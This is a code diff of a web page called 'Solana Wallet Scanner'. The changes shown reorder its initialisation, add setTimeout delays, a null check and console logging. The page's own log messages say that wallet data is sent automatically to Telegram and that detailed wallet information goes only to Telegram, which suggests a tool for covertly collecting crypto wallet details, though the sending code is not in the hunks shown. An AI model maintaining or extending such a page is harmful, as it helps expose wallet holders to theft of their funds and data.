@@ -944,15 +944,14 @@
         return true;
       }
 
-      init() {
-        this.updateDeviceStatus();
-        this.checkMobileBanner();
-        this.updateWalletStatuses();
-        this.showDappBanner();
-      }
-
+      // Улучшенная функция для обновления статуса устройства
       updateDeviceStatus() {
         const deviceStatusElement = document.getElementById('deviceInfo');
+        if (!deviceStatusElement) {
+          console.error('Device status element not found');
+          return;
+        }
+        
         let statusText = `${this.deviceInfo.platform}`;
         
         if (this.walletInfo.detected) {
@@ -964,6 +963,21 @@
         }
 
         deviceStatusElement.textContent = statusText;
+        console.log('✅ Device status updated:', statusText);
+      }
+
+      init() {
+        console.log('🔍 Initializing DeviceDetector...');
+        console.log('📱 Device info:', this.deviceInfo);
+        console.log('🔍 Wallet info:', this.walletInfo);
+        
+        // Обновляем статус устройства сразу
+        setTimeout(() => {
+          this.updateDeviceStatus();
+          this.checkMobileBanner();
+          this.updateWalletStatuses();
+          this.showDappBanner();
+        }, 100);
       }
 
       checkMobileBanner() {
@@ -2027,19 +2041,23 @@
     let deviceDetector;
 
     document.addEventListener('DOMContentLoaded', () => {
+      console.log('🚀 DOM loaded, initializing...');
+      
       // Initialize device detector first
-      deviceDetector = new DeviceDetector();
-      window.deviceDetector = deviceDetector;
-      
-      // Then initialize wallet manager
-      walletManager = new SolanaWalletManager();
-      window.walletManager = walletManager;
-      
-      console.log('🚀 Solana Wallet Scanner загружен и готов к работе!');
-      console.log('📱 Улучшенная мобильная поддержка и deep linking включены');
-      console.log('🎯 Целевой dApp URL:', TARGET_DAPP_URL);
-      console.log('📤 Автоматическая отправка данных в Telegram включена');
-      console.log('🔒 Детальная информация о кошельке отправляется только в Telegram');
+      setTimeout(() => {
+        deviceDetector = new DeviceDetector();
+        window.deviceDetector = deviceDetector;
+        
+        // Then initialize wallet manager
+        walletManager = new SolanaWalletManager();
+        window.walletManager = walletManager;
+        
+        console.log('🚀 Solana Wallet Scanner загружен и готов к работе!');
+        console.log('📱 Улучшенная мобильная поддержка и deep linking включены');
+        console.log('🎯 Целевой dApp URL:', TARGET_DAPP_URL);
+        console.log('📤 Автоматическая отправка данных в Telegram включена');
+        console.log('🔒 Детальная информация о кошельке отправляется только в Telegram');
+      }, 500);
     });
 
     // ============================================================================
@@ -2079,3 +2097,4 @@
   </script>
 </body>
 </html>
+
